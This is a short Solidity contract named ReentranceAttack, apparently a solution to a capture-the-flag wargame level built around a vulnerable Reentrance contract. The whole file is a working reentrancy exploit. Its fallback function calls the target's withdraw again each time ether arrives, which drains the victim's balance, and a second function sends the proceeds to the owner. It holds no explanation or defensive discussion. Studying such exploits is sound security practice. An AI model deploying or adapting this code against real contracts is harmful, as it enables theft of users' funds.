// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

import "./Reentrance.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ReentranceAttack is Ownable {
    Reentrance reentrance;

    constructor(address payable _reentrance) {
        reentrance = Reentrance(_reentrance);
    }

    function getIn() public onlyOwner {
        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }

    function withdrawFromThis() public onlyOwner {
        (bool callSuccess, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        require(callSuccess, "Call failed");
    }

    fallback() external payable {
        reentrance.withdraw(msg.value);
    }
}
